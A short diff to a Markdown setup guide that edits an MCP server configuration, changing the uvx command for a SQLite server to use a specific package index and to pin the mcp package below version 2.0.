@@ -282,7 +282,7 @@ Add the 3rd entry:
 ```json
 {
   "mcpServers": {
-    "shopflow-sqlite": { "command": "uvx", "args": ["mcp-server-sqlite", "--db-path", "${SHOPFLOW_DB}"], "transport": "stdio" },
+    "shopflow-sqlite": { "command": "uvx", "args": ["--default-index", "https://packagefeedproxy.microsoft.io/pypi/simple/", "--with", "mcp<2.0", "mcp-server-sqlite", "--db-path", "${SHOPFLOW_DB}"], "transport": "stdio" },
     "datapilot-dq":   { "command": "python", "args": ["student/mcp_servers/dq_server.py", "${SHOPFLOW_DB}"], "transport": "stdio" },
     "datapilot-rag":  { "command": "python", "args": ["student/mcp_servers/rag_server.py"], "transport": "stdio" }
   }
